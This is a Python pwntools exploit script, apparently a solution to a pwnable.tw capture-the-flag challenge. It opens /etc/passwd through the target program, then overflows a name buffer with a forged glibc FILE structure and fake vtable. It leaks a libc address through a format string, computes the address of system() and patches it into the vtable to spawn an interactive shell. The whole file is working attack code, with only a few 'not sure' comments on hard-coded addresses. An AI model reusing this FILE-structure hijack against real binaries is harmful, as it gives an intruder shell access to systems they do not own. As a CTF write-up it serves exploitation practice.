#!/usr/bin/env python2

from pwn import *
from IPython import embed

#r = remote('chall.pwnable.tw', 10200)
r = remote('127.0.0.1', 7122)

'''
{
  _flags = 0xfbad2488,
  _IO_read_ptr = 0x804c6ff,
  _IO_read_end = 0x804cf6f,
  _IO_read_base = 0x804c570,
  _IO_write_base = 0x804c570,
  _IO_write_ptr = 0x804c570,
  _IO_write_end = 0x804c570,
  _IO_buf_base = 0x804c570,
  _IO_buf_end = 0x804d570,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0xf7fa6cc0,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = {0x0},
  _lock = 0x804c4a8,
  _offset = 0xffffffffffffffff,
  _codecvt = 0x0,
  _wide_data = 0x804c4b4,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0x0,
  _mode = 0xffffffff,
  _unused2 = {0x0 <repeats 40 times>}
}
'''

buf = 0x804b300
main = 0x8048a37
puts_plt = 0x8048550
printf_plt = 0x8048500
printf_got = 0x804b010

funcs = [0]*2 + [main] + [0]*14 + [printf_plt] + [0]*3

payload = [
	0xfbad2488,
	'%7$x', ';sh\x00',
	#buf + 0x2ef,
	#buf + 0xb5f,
	[buf + 0x160]*6,
	0, 0, 0, 0,
	0xf775fcc0, 0x6,	# not sure
	0, 0, 0,
	buf + 0x98,
	0xffffffff, 0xffffffff,
	0,
	buf + 0xa4,
	0, 0, 0,
	0xffffffff,
	[0]*10,
	buf + 0x160,
	[0]*47,
	0xf7749830,		# not sure
	0, 0x61,	
	funcs,
	0, 0, 
	0x61, #0x61, 0x61,
	[0]*23, 0x61
]


r.send('1\n/etc/passwd\n2\n3\n5\n')
raw_input('@')
r.sendline('a'*0x20+p32(buf)+'a'*120+flat(0x161, payload))

r.recvuntil('your name :')
r.recvuntil('time\n')
x = r.recvuntil('####', drop=True)
libc_base = int(x[4:12], 16) - 0x5da69
print 'libc:', hex(libc_base)
#embed()


#magic = libc_base+0x3ac69
#system = libc_base+241056
system = libc_base+239936+0xb20
print 'system:', hex(system)
payload[-6][-4] = system
r.recvuntil('choice :')
r.sendline('5')
r.sendline('a'*0x20+p32(buf)+'a'*120+flat(0x161, payload))
r.interactive()
